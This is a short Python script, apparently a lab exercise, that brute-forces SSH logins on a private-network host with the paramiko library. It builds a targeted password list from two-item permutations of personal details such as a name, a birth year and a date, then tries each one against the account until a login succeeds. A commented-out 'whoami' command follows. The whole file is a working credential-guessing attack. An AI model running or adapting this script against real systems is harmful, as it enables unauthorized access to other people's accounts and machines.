#!/usr/local/bin/python3
import paramiko
from itertools import permutations

global ssh

attacker_info = ['YueHan', 'Wang', 'YH', '1999', '0228', 'oscar', 'Realtek', '@', '_']
info_pair = list(permutations(attacker_info, 2))
attack_dict = []
for pair in info_pair:
    attack_dict.append(str(pair[0] + pair[1]))

for key in attack_dict:
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(hostname = '192.168.22.132', port =  22, username =  'attacker', password = key)
    except paramiko.ssh_exception.AuthenticationException as e:
        ssh.close()
        continue
    else:
        correct_key = key
        break

# stdio, stdout, stderr = ssh.exec_command('whoami')
# result = stdout.read().decode('utf-8')
# print(result)
ssh.close()